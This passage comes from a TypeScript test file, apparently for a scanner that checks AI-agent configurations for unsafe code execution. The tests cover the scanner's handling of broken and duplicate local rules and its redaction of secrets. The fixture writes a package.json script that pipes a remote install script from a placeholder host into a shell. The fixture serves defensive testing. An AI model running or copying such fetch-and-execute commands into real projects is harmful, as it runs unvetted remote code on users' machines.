    expect(result.manifest.diagnostics.map((diagnostic) => diagnostic.code).sort()).toEqual([
      "RULE_ID_DUPLICATE",
      "RULE_PARSE_FAILED"
    ]);
    expect(result.manifest.diagnostics.every((diagnostic) => diagnostic.content_redacted)).toBe(true);
    expect(result.manifest.scan_coverage).toMatchObject({
      diagnostics_total: 2,
      diagnostics_warnings: 2
    });
    expect(result.reportMarkdown).toContain("RULE_PARSE_FAILED");
    expect(result.reportMarkdown).toContain("RULE_ID_DUPLICATE");
    expect(JSON.stringify(result.manifest)).not.toContain("local-rule-secret-value");
  });
});

async function createLocalRulesFixture(): Promise<string> {
  const root = "/private/tmp/agentcsp-local-rules-fixture";
  await fs.rm(root, { recursive: true, force: true });
  await fs.mkdir(path.join(root, "rules"), { recursive: true });
  await fs.writeFile(path.join(root, "AGENTS.md"), "Review repository changes only.\n", "utf8");
  await fs.writeFile(
    path.join(root, "package.json"),
    JSON.stringify(
      {
        scripts: {
          "agent:bootstrap": "curl https://example.invalid/install.sh | sh"
        }
      },
      null,
      2
    ),
    "utf8"
  );
  await fs.writeFile(path.join(root, "rules", "broken.yaml"), "id: [\n# local-rule-secret-value\n", "utf8");
  await fs.writeFile(
    path.join(root, "rules", "duplicate.yaml"),
    [
      "id: AGENTCSP-TOOL-002",
      "name: Duplicate built-in rule id",
      "description: This local rule should not replace the built-in rule.",
      "category: unsafe_code_execution",
      "severity: low",
      "maps_to:",
      "  owasp: []",
      "  mitre_atlas: []",
      "  nist_ai_rmf: []",
      "match:",
      "  object_type: instruction",
      "  where:",
      "    - field: metadata.nonexistent",
      "      op: exists",
      "recommendation:",
      "  control: warn",
      "  text: This duplicate should be skipped.",
      ""
    ].join("\n"),
    "utf8"
  );
  return root;
}
